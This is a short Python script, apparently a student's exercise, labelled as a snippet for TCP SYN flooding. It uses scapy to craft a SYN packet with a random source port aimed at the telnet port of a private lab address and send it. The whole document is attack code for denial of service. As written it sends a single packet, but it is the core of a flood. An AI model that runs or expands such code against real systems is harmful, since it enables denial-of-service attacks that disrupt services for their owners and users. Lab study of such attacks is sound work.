# all-by-pythonself
# by whichmeans
# at Cheongju University
# Snippet for TCP SYN flooding

from scapy . all import *

p = IP (dst = "10.0.2.4") / TCP (sport = RandShort (), dport = 23, flags = "S")
send (p)